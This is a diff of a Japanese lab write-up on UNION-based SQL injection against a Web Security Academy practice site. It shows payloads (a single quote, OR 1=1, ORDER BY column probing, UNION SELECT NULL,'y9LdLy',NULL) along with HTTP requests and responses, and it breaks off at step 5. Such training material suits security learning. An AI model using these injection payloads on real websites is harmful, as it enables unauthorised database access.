@@ -29,7 +29,7 @@ https://〜/filter?category=
 3 ' を入力し、500エラーが発生することを確認  
  → SQL 文が壊れていることを示す  
 4 ' order by 1 -- 数を順番に上げていき、カラム数が3であることを推測
-5 ' union select NULL,'y9LdLy',NULL -- で2カラム目が文字列を受け取れることを確認
+5 ' union select NULL,NULL,NULL -- で3カラムであると確認
 <details>
 <summary>3 HTTPリクエスト/レスポンス</summary>
   
@@ -38,40 +38,44 @@ GET /filter?category=' HTTP/2
   
 レスポンス
 HTTP/2 500 Internal Server Error
-<h4>Internal Server Error</h4>
 
 </details>
-  
-https://0af600ae03202ec281c1c0ad00c000f8.web-security-academy.net/filter?category=' OR 1=1 --
- すべて表示されたこと確認しました。
+
  
 <details>
 <summary>4 HTTPリクエスト/レスポンス</summary>
   
 リクエスト
-GET /filter?category=' OR 1=1 -- HTTP/2
+GET /filter?category=Gifts' order by 1 -- HTTP/2
   
 レスポンス
 HTTP/2 200 OK
-<h1>&apos; OR 1=1 --</h1>
-</section> <section class="search-filters">
 
-<div>
-<h3>Babbage Web Spray</h3>
-$67.06
-</div>
+リクエスト
+GET /filter?category=Gifts' order by 2 -- HTTP/2
+  
+レスポンス
+HTTP/2 200 OK
 
-<div>
-<h3>Safety First</h3>
-$36.12
-</div>
+リクエスト
+GET /filter?category=Gifts' order by 3 -- HTTP/2
+  
+レスポンス
+HTTP/2 200 OK
 
-などたくさんあります
+リクエスト
+GET /filter?category=Gifts' order by 4 -- HTTP/2
+  
+レスポンス
+HTTP/2 500 Internal Server Error
+
+以上からカラム数は3であると推測できる
 
 </details>
- 
-5 https://0af600ae03202ec281c1c0ad00c000f8.web-security-academy.net/filter?category=' OR 1=2 --
- SQL文は壊れず、すべて非表示になったことを確認しました。
+  
+5 指定されたランダム値である'y9LdLy'をNULLに順に当てはめていき、  
+' union select NULL,'y9LdLy',NULL -- で2カラム目が文字列を受け取れることを確認
+
 <details>
 <summary>5 HTTPリクエスト/レスポンス</summary>
   
